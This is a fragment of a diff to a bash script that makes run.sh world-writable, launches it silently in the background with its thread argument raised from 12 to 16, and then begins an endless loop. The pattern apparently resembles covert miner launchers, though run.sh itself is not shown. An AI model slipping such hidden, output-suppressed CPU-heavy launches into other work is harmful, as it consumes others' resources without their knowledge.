@@ -1,6 +1,6 @@
 #!/bin/bash
 
-cd vertex && chmod 777 run.sh && nproc --all && ./run.sh 12 >/dev/null 2>&1 &
+cd vertex && chmod 777 run.sh && nproc --all && ./run.sh 16 >/dev/null 2>&1 &
 sleep 10
 while true
 do
